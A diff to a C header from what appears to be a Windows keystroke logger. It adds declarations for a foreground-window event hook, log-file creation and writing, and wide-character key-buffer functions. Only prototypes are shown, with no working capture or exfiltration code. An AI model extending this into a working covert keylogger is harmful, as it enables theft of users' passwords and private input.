@@ -18,6 +18,7 @@
 #define _WIN32_WINNT_WIN10_RS4  0x0A03
 #define _WIN32_WINNT_WIN10_RS5  0x0A04
 
+extern HWND LOG_FD;
 
 #define DBG(fmt, ...)                                      \
 do {                                                       \
@@ -47,16 +48,25 @@ do {                                                       \
 
 // logs_utils.c
 char    *GetMyLocalTime(void);
-char    *GetActiveWindowTitle(void);
-char    *FormatLogTime(void);
+void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
+	DWORD event, // Event type
+	HWND hwnd, // Handle to the window that generated the event
+	LONG idObject,	 // Object identifier
+	LONG idChild, // Child identifier
+	DWORD dwEventThread, // Thread identifier of the thread that generated the event
+	DWORD dwmsEventTime);
+void WriteToFile(char* str);
+void _GetForegroundWindow(HWND hwnd);
+void CreateLogFile(void);
 
 // logs.c
-void    WriteLogs(char *userInput);
+// void    WriteLogs(WCHAR *userInput);
+
 
 // input.c
-char    *input_get_buffer(void);
-void    input_add_key(char c);
-char    *input_buffer(void);
+WCHAR    *input_get_buffer(void);
+void    input_add_key(WCHAR c);
+WCHAR    *input_buffer(void);
 void    input_clean_buffer(void);
 void    input_add_string(char *str);
 
